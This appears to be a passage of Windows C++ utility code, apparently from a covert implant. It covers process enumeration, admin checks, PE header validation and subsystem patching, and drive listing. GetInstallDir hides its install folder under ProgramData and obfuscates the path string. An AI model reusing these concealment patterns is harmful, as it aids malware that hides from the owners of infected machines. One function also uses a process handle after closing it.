                                       { return !std::isdigit(c); }) == no.end();
}
bool _isAdmin = false;
bool _adminSet = false;
bool IsAdmin()
{
    if (_adminSet)
    {
        return _isAdmin;
    }
    BOOL b = 0;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    b = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup);
    if (b)
    {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &b))
        {
            b = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }
    _adminSet = true;
    _isAdmin = b;
    return (b);
}
std::vector<Proc> GetProcs()
{
    std::vector<Proc> results;

    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD ppid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE)
        return results;

    ZeroMemory(&pe32, sizeof(pe32));
    pe32.dwSize = sizeof(pe32);
    if (!Process32First(hSnapshot, &pe32))
        return results;

    do
    {
        Proc proc{0};
        proc.Pid = pe32.th32ProcessID;

        DWORD count = MAX_PATH;

        proc.Name = pe32.szExeFile;

        // GetProcessImageFileNameA(hProcess, fullpath, count);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                          PROCESS_VM_READ,
                                      FALSE, pe32.th32ProcessID);

        // Get the process name.

        if (NULL != hProcess)
        {
            char fullpath[1024];
            QueryFullProcessImageNameA(hProcess, 0, fullpath, &count);
            proc.FullPath = fullpath;
            PROCESS_MEMORY_COUNTERS_EX pmc;
            memset(&pmc, 0, sizeof(pmc));
            GetProcessMemoryInfo(hProcess, (PROCESS_MEMORY_COUNTERS *)&pmc, sizeof(pmc));
            proc.MemoryUsed = pmc.WorkingSetSize;
        }
        if (hProcess != NULL)
        {
            CloseHandle(hProcess);
        }
        proc.PPID = pe32.th32ParentProcessID;
        proc.isX86 = IsX86Process(hProcess);

        results.push_back(proc);

    } while (Process32Next(hSnapshot, &pe32));
    CloseHandle(hSnapshot);

    return results;
}
bool writeFile(std::string file, std::vector<uint8_t> data)
{
    return writeFile(file, &data[0], data.size());
}
bool writeFile(std::string file, std::string data)
{
    return writeFile(file, &data[0], data.size());
}
bool writeFile(std::string file, void *data, size_t size)
{
    if (file.size() > MAX_PATH && !StringUtils::startsWith(file, R"(\??\)"))
    {
        file = R"(\??\)" + file;
    }
    FILE *f = fopen(file.c_str(), "wb");
    if (f != NULL)
    {
        fwrite(data, 1, size, f);
        fclose(f);
        return true;
    }
    return false;
}

bool IsValidPE(std::string exe)
{
    if (!Exists(exe))
        return false;
    auto hFile = CreateFileA(exe.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    BOOL bRet;
    DWORD dwCount;
    DWORD dwOffset;
    char szBuf[10];

    // check "MZ"
    bRet = ReadFile(hFile, szBuf, strlen(DF_DosMagic), &dwCount, NULL);

    if (!bRet || dwCount != strlen(DF_DosMagic))
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
        return false;
    }

    if (memcmp(szBuf, DF_DosMagic, strlen(DF_DosMagic)))
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
        return false;
    }

    SetFilePointer(hFile, DF_NewHeaderOffset, NULL, FILE_BEGIN);

    bRet = ReadFile(hFile, &dwOffset, sizeof(dwOffset), &dwCount, NULL);

    if (!bRet || dwCount != sizeof(dwOffset))
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
        return false;
    }

    SetFilePointer(hFile, dwOffset, NULL, FILE_BEGIN);

    // check "PE\0\0"
    bRet = ReadFile(hFile, szBuf, strlen(DF_PEMagic), &dwCount, NULL);

    if (!bRet || dwCount != strlen(DF_PEMagic))
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
        return false;
    }

    if (memcmp(szBuf, DF_PEMagic, strlen(DF_PEMagic)))
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
        return false;
    }
    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }
    return true;
}

std::string RemoveExt(std::string file)
{
    if (file == "")
        return "";
    auto name = file;
    auto idx = name.rfind(".");

    auto slashIdx = name.rfind('\\');
    if (slashIdx == std::string::npos)
    {
        slashIdx = name.rfind('/');
    }
    if (idx != std::string::npos)
    {
        name = name.substr(0, idx);
    }
    if ((slashIdx != std::string::npos && slashIdx >= idx))
    {
        return file;
    }
    return name;
}
uint64_t GetRandom(uint64_t min, uint64_t max)
{
    if (min > max)
    {
        auto tmp = min;
        min = max;
        max = tmp;
    }
    std::random_device dev;
    std::mt19937::result_type seed = dev() ^ ((std::mt19937::result_type)std::chrono::duration_cast<std::chrono::seconds>(
                                                  std::chrono::system_clock::now().time_since_epoch())
                                                  .count() +
                                              (std::mt19937::result_type)
                                                  std::chrono::duration_cast<std::chrono::microseconds>(
                                                      std::chrono::high_resolution_clock::now().time_since_epoch())
                                                      .count());

    std::mt19937 rng(seed);
    std::uniform_int_distribution<std::mt19937::result_type> dist6(min, max); // distribution in range [1, 6]

    auto res = dist6(rng);
    return res;
}
bool ChangeSubsystem(std::string exe, bool console)
{
    auto info = GetPEInfo(exe);
    if (!info.isValid)
    {
        return false;
    }
    if (console)
    {
        if (info.isConsole)
            return true;
    }
    else
    {
        if (!info.isConsole)
            return true;
    }
    WORD subsystem = console ? IMAGE_SUBSYSTEM_WINDOWS_CUI : IMAGE_SUBSYSTEM_WINDOWS_GUI;

    HANDLE hFile = CreateFileA(exe.c_str(), GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    BOOL bRet;
    DWORD dwCount;
    DWORD dwOffset;

    SetFilePointer(hFile, DF_NewHeaderOffset, NULL, FILE_BEGIN);

    bRet = ReadFile(hFile, &dwOffset, sizeof(dwOffset), &dwCount, NULL);

    if (!bRet || dwCount != sizeof(dwOffset))
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
        return false;
    }

    SetFilePointer(hFile, dwOffset + DF_SubsytemOffset, NULL, FILE_BEGIN);

    bRet = WriteFile(hFile, &subsystem, sizeof(WORD), &dwCount, NULL);

    if (!bRet || dwCount != sizeof(WORD))
    {
        if (hFile != INVALID_HANDLE_VALUE)
        {
            CloseHandle(hFile);
        }
        return false;
    }
    if (hFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
    }
    return true;
}
std::string GetInstallDir()
{
    auto id = GetMachineID();
    string path = OBFUSCATED(R"(C:\ProgramData)");
    path.append("\\");
    path.append(id);

    if (!Exists(path))
    {
        fs::create_directories(path);
        SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    return path;
}

uint64_t GetFileSize(string file)
{

    FILE *fileptr = fopen(file.c_str(), "rb"); // Open the file in binary mode
    if (fileptr != nullptr)
    {
        fseek(fileptr, 0, SEEK_END); // Jump to the end of the file
        auto filelen = (size_t)ftell(fileptr);
        fclose(fileptr);
        return filelen;
    }

    return 0;
}
bool HaveFolderPermisions(string path)
{
    if (!Exists(path))
        return false;
    if (!fs::is_directory(path))
    {
        auto file = fs::path(path);
        path = fs::absolute(file.parent_path()).string();
    }
    auto tmp = path;

    tmp += "\\" + std::to_string(GetRandom());

    while (Exists(tmp))
    {
        tmp = path + "\\" + std::to_string(GetRandom());
    }

    HANDLE hSrcFile = CreateFileA(tmp.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL);

    if (hSrcFile == INVALID_HANDLE_VALUE || hSrcFile == NULL)
        return false;
    CloseHandle(hSrcFile);
    try
    {
        std::remove(tmp.c_str());
    }
    catch (...)
    {
    }
    return true;
}
std::string ReplaceInvalidFileChars(std::string path)
{
    std::regex invalid(R"([\\/:*?""<>|])");

    std::stringstream txtItr;

    // write the results to an output iterator
    std::regex_replace(std::ostreambuf_iterator<char>(txtItr),
                       path.begin(), path.end(), invalid, "_");
    auto result = txtItr.str();
    return result;
}
std::vector<Drive> GetDrives()
{
    std::vector<Drive> results;
    char drives[MAX_DRIVES] = {0};
    char *temp = drives;

    if (GetLogicalDriveStrings(MAX_DRIVES, drives) == 0)
        return results;

    while (*temp != 0)
    {

        Drive d(temp, GetDriveType(temp) == DRIVE_REMOVABLE);
        results.push_back(d);

        temp += lstrlen(temp) + 1;
    }

    return results;
}

static std::random_device rd;
static std::mt19937 gen(rd());
static std::uniform_int_distribution<> dis(0, 15);
static std::uniform_int_distribution<> dis2(8, 11);

std::string generate_uuid_v4()
{
    std::stringstream ss;
    int i;
    ss << std::hex;
    for (i = 0; i < 8; i++)
    {
        ss << dis(gen);
    }
    ss << "-";
    for (i = 0; i < 4; i++)
    {
        ss << dis(gen);
    }
    ss << "-4";
    for (i = 0; i < 3; i++)
    {
        ss << dis(gen);
    }
    ss << "-";
    ss << dis2(gen);
    for (i = 0; i < 3; i++)
    {
        ss << dis(gen);
    }
    ss << "-";
    for (i = 0; i < 12; i++)
    {
        ss << dis(gen);
    };
    return ss.str();
}
